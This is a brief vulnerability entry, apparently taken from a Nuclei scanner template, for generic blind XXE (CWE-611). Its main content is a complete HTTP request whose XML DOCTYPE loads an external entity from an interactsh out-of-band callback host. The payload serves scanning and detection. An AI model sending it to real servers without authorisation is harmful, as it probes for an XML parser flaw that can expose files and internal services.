# Vulnerability: Generic Blind XXE
**Classification:** CWE-611
**Source:** Nuclei Template (`generic-blind-xxe.yaml`)

## Description
This template detects Generic Blind XXE.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: {{BaseURL}}

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
<foo>&e1;</foo>
```

